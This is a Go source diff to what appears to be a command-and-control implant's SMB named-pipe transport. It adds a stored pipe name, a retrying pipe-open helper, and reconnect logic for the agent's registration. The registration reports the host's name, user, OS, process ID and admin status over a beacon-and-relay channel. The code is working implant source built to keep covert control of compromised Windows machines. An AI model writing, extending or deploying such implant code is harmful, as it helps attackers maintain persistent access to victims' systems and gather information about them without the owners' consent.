@@ -135,10 +135,11 @@ func pipeWriteMsg(p *pipeConn, data []byte) error {
 }
 
 type smbClientTransport struct {
-	pipe    *pipeConn
-	agentID string
-	aesKey  []byte
-	mu      sync.Mutex // serializes all pipe operations (beacon, result, relay)
+	pipe     *pipeConn
+	pipeName string    // stored for reconnect on registration retry
+	agentID  string
+	aesKey   []byte
+	mu       sync.Mutex // serializes all pipe operations (beacon, result, relay)
 }
 
 func newSMBTransport(pipeName string) (*smbClientTransport, error) {
@@ -169,7 +170,29 @@ func newSMBTransport(pipeName string) (*smbClientTransport, error) {
 	if err != nil {
 		return nil, fmt.Errorf("open pipe %s: %w", pipeName, err)
 	}
-	return &smbClientTransport{pipe: &pipeConn{handle: h}}, nil
+	return &smbClientTransport{pipe: &pipeConn{handle: h}, pipeName: pipeName}, nil
+}
+
+// openPipeHandle opens a single named pipe handle with the standard retry loop.
+// Factored out so register() can reconnect when handleConn returns early (e.g.
+// doRequest fails) and closes its server-side instance before the child registers.
+func openPipeHandle(pipeName string) (*pipeConn, error) {
+	pipeW, err := syscall.UTF16PtrFromString(pipeName)
+	if err != nil {
+		return nil, err
+	}
+	var h syscall.Handle
+	for attempt := 0; attempt < 30; attempt++ {
+		procWaitNamedPipeW.Call(uintptr(unsafe.Pointer(pipeW)), 5000)
+		h, err = syscall.CreateFile(pipeW,
+			syscall.GENERIC_READ|syscall.GENERIC_WRITE,
+			0, nil, syscall.OPEN_EXISTING, 0, 0)
+		if err == nil {
+			return &pipeConn{handle: h}, nil
+		}
+		time.Sleep(time.Second)
+	}
+	return nil, fmt.Errorf("open pipe %s: %w", pipeName, err)
 }
 
 func (t *smbClientTransport) register(info sysInfo) error {
@@ -178,11 +201,22 @@ func (t *smbClientTransport) register(info sysInfo) error {
 	req := map[string]any{
 		"type": "REGISTER", "hostname": info.Hostname,
 		"username": info.Username, "os": info.OS, "pid": info.PID,
-		"is_admin": info.IsAdmin,
+		"is_admin": info.IsAdmin, "language": "go",
 	}
 	data, _ := json.Marshal(req)
 	if err := pipeWriteMsg(t.pipe, data); err != nil {
-		return err
+		// The server-side handleConn returned early (e.g. doRequest failed) and
+		// closed its pipe instance. ps.run() creates a new instance immediately,
+		// so reconnecting gives us a fresh handleConn on the server side.
+		t.pipe.Close()
+		newPipe, reconErr := openPipeHandle(t.pipeName)
+		if reconErr != nil {
+			return reconErr
+		}
+		t.pipe = newPipe
+		if err2 := pipeWriteMsg(t.pipe, data); err2 != nil {
+			return err2
+		}
 	}
 	resp, err := pipeReadMsg(t.pipe)
 	if err != nil {
